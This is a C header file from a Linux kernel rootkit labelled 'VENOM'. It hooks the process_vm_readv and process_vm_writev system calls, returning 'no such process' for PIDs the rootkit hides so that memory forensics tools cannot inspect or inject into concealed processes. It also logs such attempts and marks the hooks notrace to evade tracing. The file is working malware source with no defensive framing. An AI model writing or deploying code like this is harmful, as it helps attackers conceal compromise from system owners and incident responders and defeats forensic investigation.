#ifndef PROCESS_VM_HACK_H
#define PROCESS_VM_HACK_H

#include "../include/headers.h"



static asmlinkage long (*orig_process_vm_readv)(const struct pt_regs *regs);
static asmlinkage long (*orig_process_vm_writev)(const struct pt_regs *regs);


notrace static asmlinkage long hacked_process_vm_readv(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    
    if (is_pid_hidden(pid)) {
        TLOG_CRIT("[VENOM] BLOCKED memory read of hidden PID %d by %s", pid, current->comm);
        return -ESRCH;
    }
    
    TLOG_WARN("[VENOM] Memory forensics detected: %s reading PID %d", current->comm, pid);
    return orig_process_vm_readv(regs);
}


notrace static asmlinkage long hacked_process_vm_writev(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    
    if (is_pid_hidden(pid)) {
        TLOG_CRIT("[VENOM] BLOCKED memory injection into PID %d", pid);
        return -ESRCH;
    }
    
    TLOG_WARN("[VENOM] Memory injection attempt on PID %d by %s", pid, current->comm);
    return orig_process_vm_writev(regs);
}

#endif 
